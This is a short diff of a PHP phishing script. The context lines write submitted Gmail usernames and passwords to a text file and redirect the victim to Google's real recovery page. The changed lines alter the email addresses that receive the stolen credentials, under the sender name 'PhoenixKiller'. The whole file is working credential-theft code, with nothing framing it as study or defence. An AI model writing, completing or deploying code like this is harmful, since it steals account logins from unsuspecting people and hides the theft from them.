@@ -3,10 +3,10 @@
 file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
 // Recipient 
-$to = 'phoenix750@yahoo.com'; 
+$to = 'killerp750@protonmail.com'; 
  
 // Sender 
-$from = 'killerp750@protonmail.com'; 
+$from = 'hacksvc@phoenixsec.com'; 
 $fromName = 'PhoenixKiller'; 
  
 // Email subject 
